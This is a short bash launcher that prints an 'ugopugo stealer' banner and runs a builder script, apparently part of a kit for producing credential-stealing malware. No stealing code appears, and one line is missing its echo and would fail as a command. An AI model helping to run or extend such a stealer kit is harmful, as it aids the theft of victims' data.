echo -en "\033]0;ugopugo stealer\007"


echo
echo db    db  d888b   .d88b.  d8888b. db    db  d888b   .d88b.  
echo 88    88 88' Y8b .8P  Y8. 88  `8D 88    88 88' Y8b .8P  Y8. 
echo 88    88 88      88    88 88oodD' 88    88 88      88    88 
echo 88    88 88  ooo 88    88 88~~~   88    88 88  ooo 88    88 
echo 88b  d88 88. ~8~ `8b  d8' 88      88b  d88 88. ~8~ `8b  d8' 
echo ~Y8888P'  Y888P   `Y88P'  88      ~Y8888P'  Y888P   `Y88P'                                      
echo
echo
echo Coded By https://github.com/ugopugo/
echo 
echo Press any key to continue with the builder.
read -n 1 -s -r -p ""
echo ""
python builder.py

if [ $? -eq 1 ]; then
    echo error during build...
    time (sleep 1)
    Installing packages...
    time (sleep 1)
    pip3 install -r requirements.txt
    echo Installation complete!
fi

